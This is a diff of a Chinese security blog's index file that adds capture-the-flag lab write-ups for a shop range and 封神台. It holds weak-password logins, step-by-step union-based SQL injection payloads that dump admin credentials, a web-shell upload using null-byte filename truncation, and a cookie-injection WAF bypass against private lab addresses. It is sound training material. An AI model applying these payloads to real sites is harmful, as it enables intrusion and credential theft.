+<td>返回程序的完整二进制路径</td>
+</tr>
+<tr>
+<td>shred</td>
+<td>覆盖文件以隐藏其内容</td>
+</tr>
+<tr>
+<td>less</td>
+<td>以交互式检查文件</td>
+</tr>
+<tr>
+<td>tail</td>
+<td>显示文件的最后几行</td>
+</tr>
+<tr>
+<td>head</td>
+<td>显示文件的第一行</td>
+</tr>
+<tr>
+<td>grep</td>
+<td>打印与给定条件匹配行</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>输出用户名</td>
+</tr>
+<tr>
+<td>whatis</td>
+<td>显示单行说明</td>
+</tr>
+<tr>
+<td>wc</td>
+<td>字数文件</td>
+</tr>
+<tr>
+<td>uname</td>
+<td>显示操作系统信息</td>
+</tr>
+<tr>
+<td>neofetch</td>
+<td>显示操作系统和硬件信息</td>
+</tr>
+<tr>
+<td>find</td>
+<td>搜索遵循模式的文件</td>
+</tr>
+<tr>
+<td>wget</td>
+<td>从互联网检索文件</td>
+</tr>
+</tbody></table>
 ]]></content>
       <tags>
-        <tag>Web-渗透测试</tag>
+        <tag>levelup</tag>
       </tags>
   </entry>
   <entry>
@@ -1030,6 +1184,202 @@
 
 <p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
 <img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87156.png" class title="This is an test image">  
+]]></content>
+      <tags>
+        <tag>Web-渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shop靶场&amp;封神台</title>
+    <url>/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
+<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
+<p>打开虚拟机后然后双击打开shop1:</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">
+
+<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">
+
+<p>点击关闭:</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">
+
+<p>现在再点击就能打开了，如图：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">
+
+<p>点击第一行：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">
+
+<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">
+
+<p>先来试试弱密码：账号：admin 密码：admin</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">
+
+<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">
+
+
+
+
+
+<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
+<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
+<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
+<p>跳转到网页后台登录页面：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">
+
+<p>试一试之前试过的弱密码，失败</p>
+<p>接下来进行<strong>sql注入</strong></p>
+<p>打开阿D注入工具</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">
+
+<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">
+
+<p>点击检测标段，再点击admin</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">
+
+<p>点击检测字段，再把password和admin勾选上</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">
+
+<p>点击检测内容</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">
+
+<p>结果出现两组账号密码，我们任选其中一组就行</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">
+
+<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">
+
+<p>我们发现密码好像被MD5加密过了，解密得</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">
+
+<p>用获取的账号和密码进行登录</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">
+
+<p>成功登录</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">
+
+<p>上传木马</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">
+
+<p>文件上传成功</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">
+
+<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">
+
+<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">
+
+<p>打开菜刀，将木马路径输入进去</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">
+
+<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">
+
+
+
+<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">
+
+<p><strong>判断是否存在SQL注入漏洞</strong></p>
+<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 
+
+<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
+<p>2.构造 and 1&#x3D;2</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">
+
+<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
+<p><strong>判断字段数</strong></p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">
+
+<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">
+
+<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">
+
+<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
+<p><strong>判断回显点</strong></p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">
+
+<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
+<p><strong>查询相关内容</strong></p>
+<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">
+
+<p>页面回显maoshe</p>
+<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">
+
+<p>回显版本号为5.5.53</p>
+<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">
+
+<p>页面回显admin</p>
+<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
+<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">
+
+<p>回显字段名为id</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">
+
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">
+
+<p>回显password</p>
+<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">
+
+<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
+<p>得到flag</p>
+<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">
+
+<p>用御剑进行扫描，flag在二级目录里</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">
+
+<p>点击链接，得到flag</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">
+
+
+
+
+
+<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">
+
+<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
+<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
+<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
+<p>这里使用一个小工具进行注入</p>
+<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">
+
+<p>出现账号和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">
+
+<p>将密码md5解密</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">
+
+<p>用御剑进行扫描，获得后台地址：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">
+
+<p>输入之前获得的用户名和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">
+
+<p>成功拿到flag</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">
 ]]></content>
       <tags>
         <tag>Web-渗透测试</tag>
